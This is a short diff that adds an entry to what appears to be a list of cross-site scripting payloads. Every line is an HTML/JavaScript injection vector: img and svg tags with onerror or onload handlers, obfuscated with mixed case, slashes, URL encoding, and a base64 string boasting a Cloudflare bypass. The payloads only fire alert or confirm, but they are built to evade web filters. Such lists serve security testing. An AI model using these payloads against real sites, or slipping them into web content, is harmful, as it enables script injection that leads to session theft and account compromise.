@@ -1,3 +1,4 @@
+<img src=x on onerror=alert()>
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
 <Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
 %3Cimg%2Fsrc%2Fonerror%3Dalert%2F%2F%26NewLine%3B%282%29%3E
